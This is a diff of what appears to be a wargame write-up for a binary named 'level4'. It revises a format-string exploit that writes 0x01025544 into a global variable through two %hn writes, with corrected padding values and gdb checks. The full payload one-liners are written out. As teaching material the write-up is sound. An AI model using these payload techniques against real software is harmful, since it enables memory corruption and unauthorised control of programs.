@@ -3,14 +3,11 @@ same as previous level
 python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4
 
 
-but let's try it with an other way
+But we can do it another way.
 
-gdb info variables
-$1 = (<data variable, no debug info> *) 0x8049810
+We will use 2 bytes write this time,
 
-x = hexa, w = 32 bit
-gdb x/wx  0x8049810
-0x8049810 <m>:	0x00 00 00 00
+take this example
 
 0x00        00           00     		00
 0x8049813	0x8049812    0x8049811		0x8049810
@@ -21,36 +18,33 @@ we will use 0x8049812 and 0x8049810
 
 put a breakpoint on cmp
 (gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$hn" + "%13$hn"')
+
 (gdb) x/wx 0x8049810
+0x8049810 <m>:	0x00080008
 
-we successfully writed 2 bytes(8) on each location ( 0x00[08] - 00[08])
-
-remember we need to write 0x1025544 which is 0x0102 and 0x5544
-
-ok lets write 0x1025 -> 
+So we will wriite 0x0102 and the first one, and 0x5544 and the second one.
 
 since we're writing 8 bytes we need to remove it from our padding
 
 (gdb) print 0x0102 - 0x08
 $3 = 250
-run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%4125x" + "%12$hn" + "%13$hn"')
+(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250x" + "%12$hn" + "%13$hn"')
 (gdb) x/wx 0x8049810
 0x8049810 <m>:	0x01020102
 
-we successfully writed 0x1025 now the second part
-
-0x5544 -> 
-
-above we can see that the second part also get 0x1025 since we're adding padding, just remove this
+Now the second part
+We've already added 0x0102 so we need to remote it for second write.
 
 (gdb) print 0x5544 - 0x0102
-$4 = 2150
+$4 = 21570
 
-(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%4125x" +"%12$hn" + "%17695x" + "%13$hn"')
+(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250x" + "%12$hn" + "%21570x" + "%13$hn"')
 
 (gdb) x/wx 0x8049810
 0x8049810 <m>:	0x55440102
 
-oops its reverse we're writing upper bits first
+Oops it's reverse so just use 13 on first and 12 on second
 
-(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%4125x" +"%13$hn" + "%17695x" + "%12$hn"')
+./level4 < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250x"
++ "%13$hn" + "%21570x" + "%12$hn"')
+
